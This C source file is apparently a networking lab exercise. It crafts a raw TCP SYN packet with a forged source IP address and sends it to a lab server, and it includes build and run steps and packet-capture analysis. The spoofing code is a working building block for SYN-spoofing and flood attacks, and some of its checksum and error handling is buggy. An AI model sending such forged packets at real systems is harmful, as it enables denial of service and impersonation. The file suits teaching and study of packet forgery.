/*
Client code for Fake SYN attack
GW

This code sends a single SYN packet to DEST_PORT at DEST_IP making
it look like it came from SOURCE.
I connected to a tinycore VM using:
/usr/local/tinycore/tinycore -f mar20 -c at2.pcap

On linuxlab machine, compile server2.cpp:
gcc server2.cpp -o serv

And run:
./serv

Then compile this code on the tinycore VM like:
gcc client_fakesyn.c -DDEST_PORT=\"37285\" -DDEST_IP=\"172.19.3.221\" -DSOURCE=\"195.88.99.99\"

Then run it on tinycore VM with:
sudo ./a.out

Can then analyze the tcpdump output of the VM, at2.pcap.

Main structure of the code is from:
https://beej.us/guide/bgnet/html/#a-simple-stream-client

Other code referenced (noted throughout):
https://www.tenouk.com/Module43b.html
https://gist.github.com/david-hoze/0c7021434796997a4ca42d7731a7073a

*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <netdb.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>

#include <arpa/inet.h>

#define PORT "37285" // the port client will be connecting to 

/*
Structure of IP header
Based off of https://www.tenouk.com/Module43b.html

I changed quite a few attributes to get the bytes to actually
look the way they are supposed to. Mainly changed the types around
a bit to make the bytes look the way I need them. Such as combining
the ihl and ver into one short int rather than 2 chars, and set them together.
*/
struct ipheader {
 unsigned short int iph_ver;	// includes both ihl and ver
 unsigned char      iph_tos;
 unsigned short int iph_len;
 unsigned short int iph_ident;
 unsigned char      iph_ttl;
 unsigned char      iph_protocol;
 unsigned short int iph_chksum;
 unsigned int       iph_sourceip;
 unsigned int       iph_destip;
};

/* 
Structure of the TCP header 
Based off of https://www.tenouk.com/Module43b.html

I changed quite a few attributes to get the bytes to actually
look the way they are supposed to. Removed a few, added the last
3 of them, changed a couple.

*/

struct tcpheader {
 unsigned short int   tcph_srcport;
 unsigned short int   tcph_destport;
 unsigned int             tcph_seqnum;
 unsigned int             tcph_acknum;
 unsigned char tcph_hlen;
 unsigned char tcph_flag;	// fin,syn,rst,psh,ack,urg, res2
 unsigned short int   tcph_win;
 unsigned short int   tcph_chksum;
 unsigned short int   tcph_urgptr;
 unsigned char   tcph_maxseg;
 unsigned char   tcph_optlen;
 unsigned short int   tcph_mss;
};


/*
To calculate IP checksum
Directly from https://www.tenouk.com/Module43b.html, no changes.
*/
unsigned short csum (unsigned short *buf, int nwords)
{
  unsigned long sum;
  for (sum = 0; nwords > 0; nwords--)
    sum += *buf++;
  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  return (unsigned short)(~sum);

}


/*
To calculate TCP checksum, used this source:
https://gist.github.com/david-hoze/0c7021434796997a4ca42d7731a7073a

The entire function is the same except for a few lines. I adjusted some lines
to work with the way I have my icp and tcp structures set up, most notably with
calculating tcpLen. 
I needed to grab the variable that is the length and shift it right 2 
bits so that it's represented as an int instead of a char, in the right endianess.
*/
unsigned short int compute_tcp_checksum(struct ipheader *pIph, unsigned short *ipPayload) {
    register unsigned long sum = 0;
    struct tcpheader *tcphdrp = (struct tcpheader*)(ipPayload);
    unsigned int tcpLen = (tcphdrp->tcph_hlen)>>2;
    //add the pseudo header 
    //the source ip
    sum += (pIph->iph_sourceip>>16)&0xFFFF;
    sum += (pIph->iph_sourceip)&0xFFFF;
    //the dest ip
    sum += (pIph->iph_destip>>16)&0xFFFF;
    sum += (pIph->iph_destip)&0xFFFF;

    sum += htons(IPPROTO_TCP);	// protocol and reserved: 6
    sum += htons(tcpLen);
 
    //add the IP payload
    //initialize checksum to 0
    tcphdrp->tcph_chksum = 0;
    while (tcpLen > 1) {
    	if(!ipPayload) printf("ipPayload ptr is null\n");
        sum += * ipPayload++;
        tcpLen -= 2;
    }
    //if any bytes left, pad the bytes and add
    if(tcpLen > 0) {
        //printf("+++++++++++padding, %dn", tcpLen);
        sum += ((*ipPayload)&htons(0xFF00));
    }
      //Fold 32-bit sum to 16 bits: add carrier to result
      while (sum>>16) {
          sum = (sum & 0xffff) + (sum >> 16);
      }
      sum = ~sum;
      return (unsigned short)sum;
}

int main(int argc, char *argv[])
{
	/* 
	I basically took the client.c code from 
	https://beej.us/guide/bgnet/html/#a-simple-stream-client
	and changed what the client is actually doing in the loop, made it so it
	just establishes a raw socket and sends a datagram across it. 

	Heavily based on https://www.tenouk.com/Module43a.html.

	*/

	//int s1 = socket (AF_INET, SOCK_RAW, IPPROTO_TCP);
	int s1 = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
	char datagram[4096];
	memset(datagram, 0, 4096);	// zero out buffer
	char iphead_d[20] = {0};
	char tcphead_d[60] = {0};
	struct ipheader *iph = (struct ipheader *) iphead_d;
	struct tcpheader *tcph = (struct tcpheader *)tcphead_d;
	struct sockaddr_in sin;
	unsigned int dest_port = atoi(DEST_PORT);

	/*
	Set up 'sin' so sendto() works correctly and datagrams path can be determined
	*/

    sin.sin_family = AF_INET;
    sin.sin_port = htons(dest_port);
    sin.sin_addr.s_addr = inet_addr(DEST_IP);
    


	/*
	Fabricate the IP header

	Based off of https://www.tenouk.com/Module43a.html but I ended up changing
	the header and ip structures a lot to get the bytes to line up correctly,
	along with the arguments. 
	Also changed the way the datagram is being built.
	The casting used in the referenced code to built the datagram had alignment issues 
	so I made two separate arrays for the ipheader and tcp header and then used memset()
	to put the data into the datagram.
	*/

	iph->iph_ver = 0x45;
	iph->iph_tos = 16; // Not sure what this is for
	iph->iph_len = sizeof(struct ipheader) + sizeof(struct tcpheader);	// need to add payload length too?
	iph->iph_ident = htons(0);	
	iph->iph_ttl = 0x40; 
	iph->iph_protocol = 0x6; // TCP, found by inspecting valid SYN packet
	iph->iph_sourceip = inet_addr(SOURCE);
	iph->iph_destip = inet_addr(DEST_IP);
	iph->iph_chksum = 0;

	

	// Populate TCP portion
	tcph->tcph_srcport = htons (5678); // arbitrary port for source
	tcph->tcph_destport = htons (dest_port);
	tcph->tcph_seqnum = random();	// in a SYN packet, the sequence is a random
	tcph->tcph_acknum = 0;	// number, and the ACK sequence is 0 in the 1st packet
	tcph->tcph_hlen = 0x60;	
	tcph->tcph_flag = 0x02;	// Because we are sending a SYN
	tcph->tcph_win = htons (8760);

	// The following 3 arguments I just filled in based on what an accepted packet 
	// looked like in Wireshark
	tcph->tcph_maxseg=0x02;
	tcph->tcph_optlen=0x04;
	tcph->tcph_mss=htons(1460);	

	iph-> iph_chksum = csum ((unsigned short *) datagram, iph-> iph_len >> 1);
	tcph->tcph_chksum = compute_tcp_checksum((struct ipheader*)&iphead_d, (unsigned short*)&tcphead_d);
	//tcph->tcph_chksum=htons(0xd624); // From wireshark i saw it *should* be this
		// Ended up finding a function to compute the checksum instead

	// Now fill the datagram with the generated headers
	memcpy(datagram, &iphead_d, 20 );
	memcpy(&datagram[20], &tcphead_d, 60);	

	// https://stackoverflow.com/questions/32675361/print-character-array-as-hex-in-c/32675416
	// char* cp = datagram;
	// printf("datagram = \n");
	// for (int i=0; i < 2000; i++)
	// {
	//    printf(" %02x ", *cp);
	//    ++cp;
	// }

	/*
	Now can try to attempt sending the datagram.
	*/
	int sendto_ret=0;
	sendto(s1,                      /* our socket */
	    datagram,                	/* the buffer containing headers and data */
	    iph->iph_len,            	/* total length of our datagram */
	    0,                       	/* routing flags, normally always 0 */
	    (struct sockaddr *) &sin, 	/* socket addr, just like in */
	    sizeof (sin)) == sendto_ret;        /* a normal send() */

	if (sendto_ret <0) {
	    printf("sendto() error: %s\n", strerror(errno));
	}
	else {
		printf("Success: SYN packet sent.\n");
	}

	return 0;
}

